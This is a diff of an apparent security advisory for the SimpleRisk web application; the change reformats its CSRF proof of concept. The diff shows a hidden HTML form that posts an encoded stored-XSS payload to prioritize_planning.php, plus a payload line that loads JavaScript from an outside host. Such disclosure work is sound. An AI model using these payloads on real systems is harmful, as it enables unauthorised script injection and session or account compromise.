@@ -58,18 +58,18 @@ Download: <a href="https://simplerisk.googlecode.com/files/simplerisk-20130915-0
 <p>8. *Proof of Concept (PoC)*</p>
 <p>8.1 *Cross-Site Request Forgery (CSRF)*</p>
 <p>The following CSRF PoC submits a POST request to the prioritize_planning.php page with the XSS payload within the new_project parameter.</p>
-<p>[code]<br />
-&lt;html&gt;<br />
-  &lt;body&gt;<br />
-    &lt;form action=&quot;http://127.0.0.1/simplerisk/management/prioritize_planning.php&quot; method=&quot;POST&quot;&gt;<br />
-      &lt;input type=&quot;hidden&quot; name=&quot;new&amp;#95;project&quot; value=&quot;&amp;lt;script&amp;#32;src&amp;#61;&amp;#47;&amp;#47;ethicalhack3r&amp;#46;co&amp;#46;uk&amp;#47;files&amp;#47;xss&amp;#47;c&amp;#46;j&amp;gt;&amp;lt;&amp;#47;script&amp;gt;&quot; /&gt;<br />
-      &lt;input type=&quot;hidden&quot; name=&quot;add&amp;#95;project&quot; value=&quot;Add&quot; /&gt;<br />
-      &lt;input type=&quot;hidden&quot; name=&quot;projects&quot; value=&quot;&quot; /&gt;<br />
-      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;<br />
-    &lt;/form&gt;<br />
-  &lt;/body&gt;<br />
-&lt;/html&gt;<br />
-[/code]</p>
+<p>{% highlight html %}
+  <html>
+  <body>
+    <form action="http://127.0.0.1/simplerisk/management/prioritize_planning.php" method="POST">
+      <input type="hidden" name="new&#95;project" value="&lt;script&#32;src&#61;&#47;&#47;ethicalhack3r&#46;co&#46;uk&#47;files&#47;xss&#47;c&#46;j&gt;&lt;&#47;script&gt;" />
+      <input type="hidden" name="add&#95;project" value="Add" />
+      <input type="hidden" name="projects" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+{% endhighlight %}</p>
 <p>8.2 *Stored Cross-Site Scripting (XSS)*</p>
 <p>The prioritize_planning.php page accepts user supplied input via the new_project POST parameter and then later outputs that data to the page without first being sanitised or encoded. The following code was used to inject JavaScript into the application's back-end database.</p>
 <p>Payload: &lt;script src=//ethicalhack3r.co.uk/files/xss/c.j&gt;&lt;/script&gt;<br />
